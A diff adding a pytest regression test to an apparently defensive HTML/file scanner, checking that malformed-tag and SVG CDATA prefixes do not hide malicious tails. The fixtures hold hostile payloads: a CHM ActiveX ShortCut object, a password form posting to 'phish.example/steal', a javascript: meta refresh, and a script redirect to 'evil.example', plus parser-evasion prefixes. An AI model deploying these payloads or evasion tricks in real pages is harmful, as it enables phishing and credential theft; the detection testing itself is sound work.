@@ -706,3 +706,45 @@ def test_review_r7_regressions_foreignobject_html_ns_and_streaming_caps(
         "<script>window.location='https://evil.example'</script></svg>"
     ).encode()
     assert "SVG_EXTERNAL_REDIRECT" in _rule_ids(_scan(tmp_path, "svg_starve.svg", svg_pad))
+
+
+def test_review_r8_regressions_lt_in_tag_endtag_bogus_and_foreign_cdata(
+    tmp_path: Path,
+) -> None:
+    chm_tail = (
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
+    )
+    cred_tail = (
+        b'<form action="https://phish.example/steal"><input type="password"></form>'
+        b'<!--"--></body></html>'
+    )
+    meta_tail = (
+        b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
+        b'<!--"--></head></html>'
+    )
+
+    # Blocker 1: '<' inside open HTML5 tag (<a <!--x>, <a <script>>, <a <style>>, <a x=1<b/y=">)
+    # Blocker 2: end-tag open state (</1 a=">, </ a=">, </d=">) and non-ASCII <ä a=">
+    # Major 3: <![CDATA[...]]> inside <svg> foreign content in .html
+    prefixes = (
+        b"<a <!--x>",
+        b"<a <script>>",
+        b"<a <style>>",
+        b'<a x=1<b/y=">',
+        b'</1 a=">',
+        b'</ a=">',
+        b'</d=">',
+        "<\u00e4 a=\">".encode(),
+        b'<svg><![CDATA[ ><x a=" ]]></svg>',
+    )
+    for idx, prefix in enumerate(prefixes):
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(
+            _scan(tmp_path, f"r8_chm_{idx}.html", b"<!DOCTYPE html><html><body>" + prefix + chm_tail)
+        ), f"CHM missed for prefix {idx}"
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(
+            _scan(tmp_path, f"r8_cred_{idx}.html", b"<!DOCTYPE html><html><body>" + prefix + cred_tail)
+        ), f"CRED missed for prefix {idx}"
+        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
+            _scan(tmp_path, f"r8_meta_{idx}.html", b"<!DOCTYPE html><html><head>" + prefix + meta_tail)
+        ), f"META missed for prefix {idx}"
